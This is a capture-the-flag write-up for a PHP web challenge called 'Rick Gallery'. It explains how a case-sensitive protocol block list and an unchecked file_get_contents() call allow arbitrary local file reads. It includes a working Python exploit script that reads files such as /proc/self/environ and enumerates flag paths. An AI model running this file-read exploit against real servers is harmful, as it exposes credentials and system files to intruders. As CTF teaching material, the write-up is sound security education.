# Rick Gallery - CTF Web Challenge Writeup

## Challenge Overview

**Challenge Name:** Rick Gallery
**Category:** Web
**Description:** A Rick & Morty themed image gallery with a hidden vulnerability

## Initial Analysis

We're given the source code of a PHP web application consisting of:
- `index.php` - Main gallery page
- `getpic.php` - Internal image fetcher (localhost only)
- `.htaccess` - Restricts direct access to getpic.php
- `Dockerfile` - Container configuration

### Source Code Review

**index.php** - Key vulnerability:
```php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $headers = getallheaders();
    if (!empty($headers["Image"])) {
        $raw = $headers["Image"];

        // FILTER: Blocked protocols (ALL LOWERCASE!)
        $blockedProtocols = [
            "http://", "https://", "ftp://", "ftps://",
            "file://", "data://", "expect://", "php://",
            "passwd"
        ];

        foreach ($blockedProtocols as $proto) {
            if (strpos($raw, $proto) !== false) {
                $raw = "";
                break;
            }
        }

        // FILTER: Path traversal
        if (str_contains($raw, "../") || str_contains($raw, "..\\")) {
            $raw = "";
        }
        // ... passes $raw to internal curl request
    }
}

// Internal request to getpic.php
$ch = curl_init("http://localhost:80/getpic.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["picture_name" => $selected]));
```

**getpic.php** - The actual file reader:
```php
$data = file_get_contents($_POST['picture_name']);
echo base64_encode("$data");
```

## Vulnerability Identification

### 1. Case-Sensitive Filter Bypass

The filter blocks lowercase protocol wrappers:
- `php://`, `http://`, `file://`, `data://`, etc.

**Critical Discovery:** PHP stream wrappers are **case-insensitive**!

- ❌ Blocked: `php://`, `file://`, `http://`
- ✅ Bypass: `PHP://`, `FILE://`, `HTTP://`

### 2. Local File Inclusion (LFI)

Since `getpic.php` uses `file_get_contents()` on user-controlled input, and we can bypass the filter, we have arbitrary file read capability.

## Exploitation

### Step 1: Verify LFI Works

```python
import requests
import base64

TARGET = "http://65.109.194.105:8080/index.php"

def read_file(path):
    headers = {"Image": path}
    r = requests.post(TARGET, headers=headers)
    if '<br />' in r.text or 'Warning' in r.text:
        return None  # File doesn't exist
    return base64.b64decode(r.text.strip())

# Test with absolute path (no wrapper needed)
print(read_file("/etc/hostname"))
# Output: b'7be458eda235\n'
```

✅ LFI confirmed!

### Step 2: Enumerate System Files

We searched numerous locations for the flag:
- `/flag.txt` - Not found
- `/etc/passwd` - Blocked by filter (contains "passwd")
- `/proc/self/environ` - Found, but no flag reference
- `/var/log/apache2/error.log` - No flag info
- Various config files and logs

### Step 3: Finding the Flag

After extensive enumeration, the flag was found at:

```python
content = read_file("/tmp/flag.txt")
print(content.decode())
# ASIS{...}
```

## Final Exploit Script

```python
#!/usr/bin/env python3
import requests
import base64
import sys

def read_file(target, path):
    """Read a file via LFI vulnerability."""
    if not target.endswith('.php'):
        target = target.rstrip('/') + '/index.php'

    headers = {"Image": path}
    r = requests.post(target, headers=headers, timeout=10)

    # Check for error response
    if '<br />' in r.text or 'Warning' in r.text:
        return None

    try:
        decoded = base64.b64decode(r.text.strip())
        if b'Warning' in decoded:
            return None
        return decoded
    except:
        return None

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://target:8080/"

    # Read the flag
    flag = read_file(target, "/tmp/flag.txt")

    if flag:
        print(f"[+] FLAG: {flag.decode()}")
    else:
        print("[-] Flag not found at /tmp/flag.txt")

        # Try alternative locations
        alternatives = [
            "/flag.txt",
            "/flag",
            "/home/flag.txt",
            "/var/www/flag.txt",
            "/root/flag.txt",
        ]

        for path in alternatives:
            content = read_file(target, path)
            if content:
                print(f"[+] Found at {path}: {content.decode()}")
                break

if __name__ == "__main__":
    main()
```

## Key Takeaways

### 1. Case-Sensitivity Matters
PHP stream wrappers (`php://`, `file://`, `http://`, etc.) are case-insensitive. Filters that only block lowercase versions can be bypassed with uppercase variants.

### 2. file_get_contents() is Dangerous
When user input is passed to `file_get_contents()`, it creates an LFI vulnerability that can read arbitrary files on the system.

### 3. Always Check Common Locations
Don't overlook simple paths like `/tmp/`. CTF flags are often placed in:
- `/tmp/flag.txt`
- `/flag.txt`
- `/flag`
- `/home/*/flag.txt`
- Environment variables (`/proc/self/environ`)

### 4. Error-Based Detection
By checking if the response contains HTML error messages (`<br />`, `Warning`), we can determine if a file exists or not - useful for blind enumeration.

## Tools & Techniques Used

1. **Source Code Analysis** - Understanding the filter logic
2. **Protocol Wrapper Bypass** - Case-insensitive wrapper abuse
3. **LFI Exploitation** - Reading arbitrary files
4. **Systematic Enumeration** - Checking multiple file locations
5. **Error-Based Oracle** - Detecting file existence via error messages

## References

- [PHP Stream Wrappers](https://www.php.net/manual/en/wrappers.php)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

## Flag

```
ASIS{...}
```
